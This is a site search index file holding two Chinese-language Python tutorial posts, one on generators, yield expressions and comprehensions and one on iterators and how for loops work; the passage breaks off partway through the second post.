<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>22.python生成器</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/22.python%E7%94%9F%E6%88%90%E5%99%A8/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/22.python%E7%94%9F%E6%88%90%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>列表、字符串、元组、字典、集合这些可迭代对象都会因为内存大小被限制，而迭代器是一个数据流，单次只会将一个值放入内存，就没有了这个限制</p><p>现在需求是一个无限大小的数据类型，所以需要用到迭代器，但用文件来完成又不合适，这时候就需要用到自定义迭代器，也就是生成器</p><a id="more"></a><hr><h1 id="自定义的迭代器"><a href="#自定义的迭代器" class="headerlink" title="自定义的迭代器"></a>自定义的迭代器</h1><p>在函数内一旦存在<strong>yield关键字</strong>,<strong>调用函数并不会执行函数体代码</strong>，会返回一个<strong>生成器对象</strong>，生成器即自定义的迭代器</p><p>ps：函数本身不是迭代器，返回的才是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    print(<span class="string">&quot;第一次&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    print(<span class="string">&quot;第二次&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    print(<span class="string">&quot;第三次&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line">g = func()</span><br><span class="line">print(g) <span class="comment"># &lt;generator object func at 0x0000020F51A47BA0&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成器就是迭代器</span></span><br><span class="line"><span class="comment"># g_iter =  g.__iter__() # 可不写，写不写不会有任何变化</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 会触发函数体代码的运行,将yield后面的值当作本次调用的结果</span></span><br><span class="line">g.__next__() <span class="comment"># 第一次</span></span><br><span class="line">res = g.__next__() <span class="comment"># 第二次</span></span><br><span class="line">res2 = g.__next__() <span class="comment"># 第三次</span></span><br><span class="line">print(<span class="string">&#x27;res=%s,res=%s&#x27;</span>%(res,res2))</span><br><span class="line"><span class="comment"># 同样超出取值次数超过元素数，则报错StopIteration</span></span><br><span class="line"><span class="comment"># g.__next__() # StopIteration</span></span><br></pre></td></tr></table></figure><h3 id="额外小知识"><a href="#额外小知识" class="headerlink" title="额外小知识"></a>额外小知识</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 他们是同样操作的不同写法</span></span><br><span class="line">len(a)  a.__len__()</span><br><span class="line">iter(g) g.__iter__()</span><br><span class="line">next(g) g.__next__()</span><br></pre></td></tr></table></figure><h2 id="演示案例range"><a href="#演示案例range" class="headerlink" title="演示案例range"></a>演示案例range</h2><p>range我们之前已经接触过了，这里使用yield来写一个自己的range</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_range</span>(<span class="params">start,stop,step=<span class="number">1</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;my_range(起始位置，结束位置，步长)&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> start&lt;stop:</span><br><span class="line">        <span class="keyword">yield</span> start</span><br><span class="line">        start += step</span><br><span class="line">g = my_range(<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>)</span><br><span class="line">print(next(g)) <span class="comment"># 1</span></span><br><span class="line">print(next(g)) <span class="comment"># 3</span></span><br><span class="line"><span class="comment"># print(next(g)) # StopIteration</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> my_range(<span class="number">1</span>,<span class="number">7</span>,<span class="number">2</span>):</span><br><span class="line">    print(n) <span class="comment"># 可以直接for循环</span></span><br></pre></td></tr></table></figure><h3 id="小问题：生成器是否能被list"><a href="#小问题：生成器是否能被list" class="headerlink" title="小问题：生成器是否能被list()"></a>小问题：生成器是否能被list()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">    count =<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">yield</span> count</span><br><span class="line">g = add()</span><br><span class="line">list(g)</span><br></pre></td></tr></table></figure><p>答案是可以的，list原理和for循环是一样的，会不停的将值放入列表，就会导致内存开始爆炸</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201229173758447.png" alt="image-20201229173758447"></p><hr><h1 id="yield表达式"><a href="#yield表达式" class="headerlink" title="yield表达式"></a>yield表达式</h1><p>yield有两个功能，一个就是控制返回值，而另一个则是接受传值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x = yield 返回值</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dog</span>(<span class="params">name</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;dog%s准备吃东西了&#x27;</span>%name)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># x 拿到的是yield接收到的值</span></span><br><span class="line">        x = <span class="keyword">yield</span> <span class="literal">None</span></span><br><span class="line">        print(<span class="string">&#x27;dog%s吃了%s&#x27;</span>%(name,x))</span><br><span class="line"></span><br><span class="line">g = dog(<span class="string">&#x27;xin&#x27;</span>)</span><br><span class="line"><span class="comment"># 函数完成赋值的时候，还没有运行函数体代码，这时候直接进行赋值，找不到yield对于的x，所以会报错</span></span><br><span class="line"><span class="comment"># g.send(&#x27;一根骨头&#x27;) # can&#x27;t send non-None value to a just-started generator</span></span><br><span class="line"><span class="comment"># 使用next或者send(none)让他暂停到yield那个位置上去</span></span><br><span class="line">next(g) <span class="comment"># 等同于g.send(none)</span></span><br><span class="line">g.send(<span class="string">&#x27;一根骨头&#x27;</span>) <span class="comment"># 给yield传值</span></span><br><span class="line">next(g) <span class="comment"># 等同于g.send(none)  dogxin吃了None</span></span><br><span class="line">g.send(<span class="string">&#x27;肉包子&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">输出结果：</span></span><br><span class="line"><span class="string">dogxin准备吃东西了</span></span><br><span class="line"><span class="string">dogxin吃了一根骨头</span></span><br><span class="line"><span class="string">dogxin吃了None</span></span><br><span class="line"><span class="string">dogxin吃了肉包子</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">g.close() <span class="comment"># 关闭之后无法传值</span></span><br><span class="line">g.send(<span class="string">&#x27;111&#x27;</span>) <span class="comment"># 报错StopIteration</span></span><br><span class="line"><span class="comment"># 同样yield也支持解压复制和列表传值</span></span><br></pre></td></tr></table></figure><h2 id="yield表达式的运行流程"><a href="#yield表达式的运行流程" class="headerlink" title="yield表达式的运行流程"></a>yield表达式的运行流程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dog</span>(<span class="params">name</span>):</span></span><br><span class="line">    food_list = []</span><br><span class="line">    print(<span class="string">&#x27;dog%s准备吃东西了&#x27;</span>%name)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="keyword">yield</span> food_list</span><br><span class="line">        print(<span class="string">&#x27;dog %s 吃了 %s&#x27;</span>%(name,x))</span><br><span class="line">        food_list.append(x)</span><br><span class="line">g = dog(<span class="string">&#x27;xin&#x27;</span>)</span><br><span class="line">res = g.send(<span class="literal">None</span>)</span><br><span class="line">print(res)</span><br><span class="line">res = g.send(<span class="string">&#x27;骨头&#x27;</span>)</span><br><span class="line">print(res) <span class="comment"># None</span></span><br><span class="line">res = g.send(<span class="string">&#x27;包子&#x27;</span>)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>代码从上而下进入，<code>res = g.send(None)</code>相当于next，运行到yield，返回的food_list为空列表，然后，暂停住了，运行外部代码<code>res = g.send(&#39;骨头&#39;)</code>，send把<code>骨头</code>交给了yield，yield交给了x，继续运行，运行到<code>food_list.append(x)</code>，然后开启下一次循环，又遇到了yield，返回了这一次的结果food_list = [‘骨头’] 依此类推</p><p>代码调用时检测到有yield就会暂停等待send/next，得到命令后需要遇到下一个yield再返回本次结果，并且暂停住等待调用</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20210102145222369.png" alt="image-20210102145222369"></p><hr><h1 id="生成式"><a href="#生成式" class="headerlink" title="生成式"></a>生成式</h1><p>生成式顾名思义就是生成东西，其实就是把循环添加过程给简化了</p><h2 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h2><p>列表生成式是为了我们简化代码的一种解决方案，用来快速生成列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="string">&#x27;yzc_one&#x27;</span>,<span class="string">&#x27;lbg_one&#x27;</span>,<span class="string">&#x27;amber_two&#x27;</span>,<span class="string">&#x27;aym_two&#x27;</span>]</span><br><span class="line">one_l = []</span><br><span class="line">two_l = []</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> l:</span><br><span class="line">    <span class="comment"># endswith如果字符串含有指定的后缀返回 True，否则返回 False。</span></span><br><span class="line">    <span class="keyword">if</span> name.endswith(<span class="string">&#x27;one&#x27;</span>):</span><br><span class="line">        one_l.append(name)</span><br><span class="line">print(one_l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表生成式</span></span><br><span class="line">two_l = [name <span class="keyword">for</span> name <span class="keyword">in</span> l <span class="keyword">if</span> name.endswith(<span class="string">&#x27;two&#x27;</span>)]</span><br><span class="line"><span class="comment"># 列表生成式分为三部分 [结果 for循环 if判断]</span></span><br><span class="line"><span class="comment"># 上诉含义：for name in l 进行循环 if name.endswith(&#x27;two&#x27;) 判断成立，就将第一个name放入列表中</span></span><br><span class="line">print(two_l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以不加if判断，就相当于if恒成立,name全部会被放入新列表</span></span><br><span class="line">three = [name <span class="keyword">for</span> name <span class="keyword">in</span> l]</span><br><span class="line">print(three) <span class="comment"># [&#x27;yzc_one&#x27;, &#x27;lbg_one&#x27;, &#x27;amber_two&#x27;, &#x27;aym_two&#x27;]</span></span><br></pre></td></tr></table></figure><p>案例练习</p><p>把所有小写字母全都变成大写字母，把所有的one名字全去掉后缀</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="string">&#x27;yzc_one&#x27;</span>,<span class="string">&#x27;lbg_one&#x27;</span>,<span class="string">&#x27;amber_two&#x27;</span>,<span class="string">&#x27;aym_two&#x27;</span>]</span><br><span class="line"><span class="comment"># 把所有小写字母全都变成大写字母</span></span><br><span class="line"><span class="comment"># string.lower()大写转小写 string.upper()小写转大写</span></span><br><span class="line">new_l1 = [name.upper() <span class="keyword">for</span> name <span class="keyword">in</span> l]</span><br><span class="line">print(new_l1) <span class="comment"># [&#x27;YZC_ONE&#x27;, &#x27;LBG_ONE&#x27;, &#x27;AMBER_TWO&#x27;, &#x27;AYM_TWO&#x27;]</span></span><br><span class="line"><span class="comment"># 把所有的one名字全去掉后缀</span></span><br><span class="line">new_l2 = [name.split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">0</span>] <span class="keyword">for</span> name <span class="keyword">in</span> l <span class="keyword">if</span> name.endswith(<span class="string">&#x27;one&#x27;</span>)]</span><br><span class="line">print(new_l2) <span class="comment"># [&#x27;yzc&#x27;, &#x27;lbg&#x27;]</span></span><br><span class="line">new_l3 = [name.replace(<span class="string">&#x27;_one&#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> name <span class="keyword">in</span> l]</span><br><span class="line">print(new_l3) <span class="comment"># [&#x27;yzc&#x27;, &#x27;lbg&#x27;, &#x27;amber_two&#x27;, &#x27;aym_two&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="字典生成式"><a href="#字典生成式" class="headerlink" title="字典生成式"></a>字典生成式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">keys = [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;gender&#x27;</span>]</span><br><span class="line">items = &#123;key:<span class="literal">None</span> <span class="keyword">for</span> key <span class="keyword">in</span> keys&#125;</span><br><span class="line">print(items)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成字典不要gender</span></span><br><span class="line">item = [(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;egon&#x27;</span>),(<span class="string">&#x27;age&#x27;</span>,<span class="number">18</span>),(<span class="string">&#x27;gender&#x27;</span>,<span class="string">&#x27;male&#x27;</span>)]</span><br><span class="line"><span class="comment"># 转换为字典，但不要gender这一组</span></span><br><span class="line"><span class="comment"># k,v in item 为解压操作</span></span><br><span class="line">res = &#123;k:v <span class="keyword">for</span> k,v <span class="keyword">in</span> item <span class="keyword">if</span> k != <span class="string">&#x27;gender&#x27;</span>&#125;</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><h2 id="集合生成式"><a href="#集合生成式" class="headerlink" title="集合生成式"></a>集合生成式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;yzc&#x27;</span>,<span class="string">&#x27;aym&#x27;</span>,<span class="string">&#x27;lbg&#x27;</span>]</span><br><span class="line">dict = &#123;name <span class="keyword">for</span> name <span class="keyword">in</span> l&#125;</span><br><span class="line">print(dict)</span><br></pre></td></tr></table></figure><h2 id="元组生成式？是没有的，这叫生成器表达式"><a href="#元组生成式？是没有的，这叫生成器表达式" class="headerlink" title="元组生成式？是没有的，这叫生成器表达式"></a>元组生成式？是没有的，这叫生成器表达式</h2><p>上面的都是为了引入这个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g = (i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>) <span class="keyword">if</span> i&gt;<span class="number">3</span>)</span><br><span class="line">print(g,type(g)) <span class="comment"># &lt;generator object &lt;genexpr&gt; at 0x00000120D0937BA0&gt; &lt;class &#x27;generator&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>报错显示，这是一个生成器对象，我们先回到生成式，生成式的本质是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">3</span> :</span><br><span class="line">        g.append</span><br></pre></td></tr></table></figure><p>而g是元组，元组是无序的无法执行append，就无法成为生成式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g = (i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>) <span class="keyword">if</span> i&lt;<span class="number">3</span>)</span><br><span class="line">print(g.__next__())</span><br><span class="line">print(g.__next__())</span><br><span class="line">print(g.__next__())</span><br></pre></td></tr></table></figure><p>所以其实生成的是生成器</p><h3 id="案例：统计文件字符"><a href="#案例：统计文件字符" class="headerlink" title="案例：统计文件字符"></a>案例：统计文件字符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方案一 ： 代码太复杂</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        res += len(line)</span><br><span class="line">    print(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sum ： 求累加和 sum += xx 支持可迭代对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方案二 ： 如果文件行数过多也会造成内存负担</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res = sum([len(line) <span class="keyword">for</span> line <span class="keyword">in</span> f])</span><br><span class="line">    print(res)</span><br><span class="line"><span class="comment"># 方案三 ： 使用生成器 - 每次只出现一行代码</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 这里直接生成可迭代对象</span></span><br><span class="line">    res = sum((len(line) <span class="keyword">for</span> line <span class="keyword">in</span> f))</span><br><span class="line">    print(res)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>, mode=<span class="string">&#x27;rt&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 这里可以省略一组括号，默认识别为生成器</span></span><br><span class="line">    res1 = sum(len(line) <span class="keyword">for</span> line <span class="keyword">in</span> f)</span><br><span class="line">    print(res1)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>21.python迭代器</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/21.python%E8%BF%AD%E4%BB%A3%E5%99%A8/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/21.python%E8%BF%AD%E4%BB%A3%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>迭代器指的是迭代取值的工具</strong>，迭代指的是一个重复的过程，每一次重复都是基于上一次的结果而继续，<strong>单纯的重复并不是迭代</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">    print(count)</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>迭代器涉及到把多个值循环取出来的工作，涉及类型包括：列表、字符串、元组、字典、集合、文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 现在我们暂时忘记for循环,将下列列表取出</span></span><br><span class="line">l = [<span class="string">&#x27;egon&#x27;</span>,<span class="string">&#x27;liu&#x27;</span>,<span class="string">&#x27;alex&#x27;</span>]</span><br><span class="line">list_len = len(l)</span><br><span class="line"><span class="keyword">while</span> list_len &gt; <span class="number">0</span>:</span><br><span class="line">    list_len = list_len - <span class="number">1</span></span><br><span class="line">    print(l[list_len])</span><br><span class="line"><span class="comment"># 此取值方式是根据索引自减进行的，不适用于没有索引类型的取值(例如字典)</span></span><br></pre></td></tr></table></figure><p>为了解决基于索引取值的局限性，python必须提供一种<strong>不依赖于索引的取值方式</strong>，就是迭代器</p><a id="more"></a><hr><h1 id="可迭代对象"><a href="#可迭代对象" class="headerlink" title="可迭代对象"></a>可迭代对象</h1><p>在了解迭代器之前，我们首先需要了解一下可迭代对象</p><p>在python语法中，但凡内置有<code>__iter__</code>方法的都称之为可迭代的对象，换个说法就是可以使用<code>__iter__</code>方法将可迭代对象转换为迭代器对象</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201224162118990.png" alt="image-20201224162118990"></p><p>可迭代对象：字符串、列表、元组、字典、集合、文件对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s1.__iter__()</span><br><span class="line">l = []</span><br><span class="line">l.__iter__()</span><br><span class="line">t = &#123;<span class="string">&#x27;a&#x27;</span>,&#125;</span><br><span class="line">t.__iter__()</span><br><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>&#125;</span><br><span class="line">d.__iter__()</span><br><span class="line">set = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">set.__iter__()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.__iter__()</span><br></pre></td></tr></table></figure><hr><h1 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h1><p>调用可迭代对象下的<code>__iter__</code>方法会将其转换成迭代器对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line">res = d.__iter__()</span><br><span class="line">print(res) <span class="comment"># &lt;dict_keyiterator object at 0x0000015A3E5F0270&gt;</span></span><br></pre></td></tr></table></figure><p>转换为迭代器对象之后，可以使用<code>__next__</code>进行取值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line">d_iter = d.__iter__()</span><br><span class="line">print(d_iter) <span class="comment"># &lt;dict_keyiterator object at 0x0000015A3E5F0270&gt;</span></span><br><span class="line"><span class="comment"># 三次取值会依次取元素，取值次数超过元素数，则报错</span></span><br><span class="line">print(d_iter.__next__()) <span class="comment"># a</span></span><br><span class="line">print(d_iter.__next__()) <span class="comment"># b</span></span><br><span class="line">print(d_iter.__next__()) <span class="comment"># c</span></span><br><span class="line">print(d_iter.__next__()) <span class="comment"># 抛出异常StopIteration</span></span><br></pre></td></tr></table></figure><h2 id="修改循环取值代码"><a href="#修改循环取值代码" class="headerlink" title="修改循环取值代码"></a>修改循环取值代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line">d_iter = d.__iter__()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(d_iter.__next__())</span><br><span class="line">    <span class="keyword">except</span> StopIteration: <span class="comment"># 捕捉到错误语法StopIteration执行下方代码</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>try...except...</code>捕捉错误语法，例如上文代码就是捕捉错误语法<code>StopIteration</code></p><hr><h1 id="for循环的工作原理"><a href="#for循环的工作原理" class="headerlink" title="for循环的工作原理"></a>for循环的工作原理</h1><p>其实for循环的工作原理和之前的while循环取值代码是一样的，所以for循环又被称为迭代器循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">    print(k)</span><br><span class="line"><span class="comment"># 1. dic.__iter__()得到迭代器对象</span></span><br><span class="line"><span class="comment"># 2. 迭代器对象.__next__()拿到一个返回值,然后将返回值复制给k</span></span><br><span class="line"><span class="comment"># 3. 循环往复步骤2,直到抛出异常StopIteration异常,for循环捕捉异常,结束循环</span></span><br></pre></td></tr></table></figure><p>但是我们这里需要注意这么一个问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 